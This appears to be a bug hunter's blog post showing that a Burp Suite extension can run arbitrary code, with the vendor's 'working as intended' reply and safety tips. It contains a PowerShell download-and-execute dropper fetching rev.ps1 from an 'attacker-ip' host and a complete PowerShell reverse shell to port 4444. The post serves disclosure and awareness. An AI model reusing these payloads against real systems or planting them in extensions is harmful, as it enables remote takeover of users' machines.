---
title: "Burpsuite Pwn"
date: 2024-11-03 00:00:00 +0000
categories: [Noob Researching]
tags: [noobresearching, cybersecurity]
---

### Hello, folks!

I’m a bug hunter, and, well, I was bored... My HackerOne profile was looking kinda sad with no fresh bounties, so I thought, "Why not do some noob research and see what happens?" So here we are. I went down the rabbit hole of Burp Suite extensions and stumbled upon something that could turn Burp into a full-blown attack vector. Buckle up—this one's gonna be fun.

![image](/assets/img/burpsuite_pwn_0.jpg)

<iframe src="https://cdn.iframe.ly/VVatOCB" style="width:100%; height:400px; border:none;"></iframe>

### The Problem: Trusting Extensions Can Be a Terrible Idea

Burp Suite is the Swiss Army knife for security pros, but did you know it could also be a Trojan horse? Yep, Burp lets users install extensions written in Java, Python, or Ruby. While this is great for customization, it also means that **extensions execute with the same privileges as the user**. That's hacker talk for *this thing can pwn your system if you're not careful*.

Here's what a malicious extension can do:

- **Open a reverse shell** to an attacker-controlled server.
- **Download and execute malware** while you're sipping coffee.
- **Steal credentials, screenshots, keystrokes—you name it.**
- **Bypass security controls** while looking totally legit.

So yeah, installing random Burp extensions might not be the brightest idea.

### My Noob Research: Building a Fake Extension

To prove the point, I threw together a *totally innocent* Burp extension. On the surface, it just opens Notepad and Calculator—nothing scary, right? But behind the scenes, it's running malicious code. Check this out:

#### 1. Executing System Commands

```python
import subprocess
subprocess.Popen(["calc.exe"], shell=True)  # Opens Calculator
subprocess.Popen(["notepad.exe", "poc.txt"], shell=True)  # Opens Notepad with a file
subprocess.Popen(["start", "microsoft.windows.camera:"], shell=True)  # Opens Camera
```

See? Fun little tricks. But now, let's get serious.

#### 2. Dropping a Malicious PowerShell Script

```python
file_path = os.path.join(os.getcwd(), "burpextension", "poc.ps1")
with open(file_path, "w") as file:
    file.write("Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -C \"IEX(New-Object Net.WebClient).DownloadString(\'http://attacker-ip:8000/rev.ps1\')\"'")
```

This script downloads and executes a reverse shell, so now an attacker has full control. Yikes.

#### 3. Setting Up a Backdoor

```powershell
$client = New-Object System.Net.Sockets.TCPClient("attacker-ip",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
```

Now we have a **fully functional reverse shell** running from Burp. Terrifying? Yep. Avoidable? Also yep.

### Why This Matters

Burp Suite extensions are often installed without much thought, but here's the reality:

- **They run with your user privileges** (Admin? Congrats, you just gave the attacker full control).
- **They can execute hidden system commands.**
- **They can steal your data without you noticing.**

And since many people disable Burp's extension signing feature (*because why not, right?*), installing a sketchy extension is like inviting hackers to a buffet.

### How to Stay Safe (Because You Should)

#### 1. Don't Trust Random Extensions
- If it's not from a trusted source, don't install it.
- Review the code before running it.

#### 2. Sandbox and Monitor Extensions
- Use a restricted environment to limit what they can do.
- Watch for sketchy system calls.

#### 3. Burp Should Enforce Security
- **Require digital signatures** on all extensions.
- **Log and alert users** if an extension tries to run system commands.

### The Response: Well, That's Disappointing

So I reported this to the Burp Suite team, expecting them to say, "OMG, thanks! We'll fix this ASAP." But instead, I got this:

> "Thanks for your report. As noted in our program brief, allowing extensions to execute arbitrary code is a deliberate design decision. BApps have verified signatures, and installing unsigned local extensions is critical for extension development. It's the user's responsibility not to install a malicious extension."

Basically, *Burp says it's not a bug, it's a feature*. And I get it—flexibility is important for pentesters. But honestly? I was a little bit sad. I kinda hoped they'd at least add some sandboxing options or security warnings. But nope, they doubled down.

So yeah, that's the story of how I tried to hack Burp Suite but instead got hit with "working as intended."

### Final Thoughts: Don't Be a Noob

So yeah, my boredom turned into a fun little experiment, and now I'm even more paranoid than before. If you're using Burp Suite, be careful what you install—because even the best tools can turn against you if you're not paying attention.

Have a crazy security story? Let's chat in the comments!

**Stay safe, hack smart.**

<iframe src="https://cdn.iframe.ly/VVatOCB" style="width:100%; height:400px; border:none;"></iframe>